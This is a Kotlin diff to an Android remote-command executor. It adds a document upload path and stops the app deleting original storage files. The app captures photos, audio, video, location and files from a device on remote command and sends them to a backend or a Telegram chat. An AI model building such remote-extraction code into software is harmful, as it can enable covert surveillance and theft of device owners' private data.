@@ -283,26 +283,49 @@ class CommandExecutor @Inject constructor(
 
             for (p in allPhotos) {
                 if (p.exists() && p.length() > 0) {
-                    val enc = enqueueAndEncryptEvidence(commandId, p, "PHOTO")
-                    processedPhotos.add(enc.first)
-                    if (enc.second.isNotBlank()) photoUploadIds.add(enc.second)
+                    val isPhotoTemp = p.absolutePath.startsWith(context.cacheDir.absolutePath) || p.absolutePath.startsWith(context.filesDir.absolutePath)
+                    if (isPhotoTemp) {
+                        val enc = enqueueAndEncryptEvidence(commandId, p, "PHOTO")
+                        processedPhotos.add(enc.first)
+                        if (enc.second.isNotBlank()) photoUploadIds.add(enc.second)
+                    } else {
+                        // User's existing storage file (e.g. /getfile) - preserve original file!
+                        processedPhotos.add(p)
+                    }
                 }
             }
 
             var audio = result.audioFile
             var audioUploadId = ""
             if (audio != null && audio.exists() && audio.length() > 0) {
-                val a = enqueueAndEncryptEvidence(commandId, audio, "AUDIO")
-                audio = a.first
-                audioUploadId = a.second
+                val isAudioTemp = audio.absolutePath.startsWith(context.cacheDir.absolutePath) || audio.absolutePath.startsWith(context.filesDir.absolutePath)
+                if (isAudioTemp) {
+                    val a = enqueueAndEncryptEvidence(commandId, audio, "AUDIO")
+                    audio = a.first
+                    audioUploadId = a.second
+                }
             }
 
             var video = result.videoFile
             var videoUploadId = ""
             if (video != null && video.exists() && video.length() > 0) {
-                val v = enqueueAndEncryptEvidence(commandId, video, "VIDEO")
-                video = v.first
-                videoUploadId = v.second
+                val isVideoTemp = video.absolutePath.startsWith(context.cacheDir.absolutePath) || video.absolutePath.startsWith(context.filesDir.absolutePath)
+                if (isVideoTemp) {
+                    val v = enqueueAndEncryptEvidence(commandId, video, "VIDEO")
+                    video = v.first
+                    videoUploadId = v.second
+                }
+            }
+
+            var doc = result.documentFile
+            var docUploadId = ""
+            if (doc != null && doc.exists() && doc.length() > 0) {
+                val isDocTemp = doc.absolutePath.startsWith(context.cacheDir.absolutePath) || doc.absolutePath.startsWith(context.filesDir.absolutePath)
+                if (isDocTemp) {
+                    val d = enqueueAndEncryptEvidence(commandId, doc, "DOCUMENT")
+                    doc = d.first
+                    docUploadId = d.second
+                }
             }
 
             val delivered = sendResponseToBackend(
@@ -312,20 +335,31 @@ class CommandExecutor @Inject constructor(
                 photoFiles = processedPhotos,
                 audioFile = audio,
                 videoFile = video,
+                documentFile = doc,
                 location = result.location
             )
 
             if (delivered) {
-                (photoUploadIds + listOf(audioUploadId, videoUploadId)).filter { it.isNotBlank() }.forEach { upId ->
+                (photoUploadIds + listOf(audioUploadId, videoUploadId, docUploadId)).filter { it.isNotBlank() }.forEach { upId ->
                     pendingUploadDao.getById(upId)?.let { u ->
                         pendingUploadDao.update(u.copy(status = "COMPLETED", completedAt = System.currentTimeMillis()))
                     }
                 }
                 for (p in processedPhotos) {
-                    try { p.delete() } catch (_: Exception) {}
+                    val isTemp = p.absolutePath.startsWith(context.cacheDir.absolutePath) || p.absolutePath.startsWith(context.filesDir.absolutePath)
+                    if (isTemp) {
+                        try { p.delete() } catch (_: Exception) {}
+                    }
                 }
-                try { audio?.delete() } catch (_: Exception) {}
-                try { video?.delete() } catch (_: Exception) {}
+                if (audio != null && (audio.absolutePath.startsWith(context.cacheDir.absolutePath) || audio.absolutePath.startsWith(context.filesDir.absolutePath))) {
+                    try { audio.delete() } catch (_: Exception) {}
+                }
+                if (video != null && (video.absolutePath.startsWith(context.cacheDir.absolutePath) || video.absolutePath.startsWith(context.filesDir.absolutePath))) {
+                    try { video.delete() } catch (_: Exception) {}
+                }
+                if (doc != null && (doc.absolutePath.startsWith(context.cacheDir.absolutePath) || doc.absolutePath.startsWith(context.filesDir.absolutePath))) {
+                    try { doc.delete() } catch (_: Exception) {}
+                }
             } else {
                 // Direct fallback to Telegram
                 sendText(parsed.chatId, result.message)
@@ -336,7 +370,7 @@ class CommandExecutor @Inject constructor(
                 }
                 audio?.let { sendAudio(parsed.chatId, it, "🎙️ Audio recording") }
                 video?.let { sendVideo(parsed.chatId, it, "🎥 Captured video") }
-                result.documentFile?.let { sendDocument(parsed.chatId, it, "📄 ${it.name}") }
+                doc?.let { sendDocument(parsed.chatId, it, "📄 ${it.name}") }
                 result.location?.let { (lat, lng) -> sendLocation(parsed.chatId, lat, lng) }
             }
 
@@ -363,6 +397,7 @@ class CommandExecutor @Inject constructor(
         photoFiles: List<File>? = null,
         audioFile: File? = null,
         videoFile: File? = null,
+        documentFile: File? = null,
         location: Pair<Double, Double>? = null
     ): Boolean {
         if (!preferencesManager.useBackendServer) return false
@@ -442,6 +477,28 @@ class CommandExecutor @Inject constructor(
                 } else null
             }
 
+            val documentPart = documentFile?.let {
+                if (it.exists() && it.length() > 0) {
+                    val reqFile = if (encryptionManager.isEncryptedVaultFile(it)) {
+                        object : okhttp3.RequestBody() {
+                            override fun contentType() = "application/octet-stream".toMediaTypeOrNull()
+                            override fun writeTo(sink: okio.BufferedSink) {
+                                encryptionManager.decryptEvidenceVaultToStream(it).use { input ->
+                                    val buffer = ByteArray(8192)
+                                    var read: Int
+                                    while (input.read(buffer).also { read = it } != -1) {
+                                        sink.write(buffer, 0, read)
+                                    }
+                                }
+                            }
+                        }
+                    } else {
+                        it.asRequestBody("application/octet-stream".toMediaTypeOrNull())
+                    }
+                    MultipartBody.Part.createFormData("document", it.name, reqFile)
+                } else null
+            }
+
             val latBody = location?.first?.toString()?.toRequestBody("text/plain".toMediaTypeOrNull())
             val lngBody = location?.second?.toString()?.toRequestBody("text/plain".toMediaTypeOrNull())
 
@@ -454,6 +511,7 @@ class CommandExecutor @Inject constructor(
                 audio = audioPart,
                 video = videoPart,
                 evidence = null,
+                document = documentPart,
                 latitude = latBody,
                 longitude = lngBody
             )
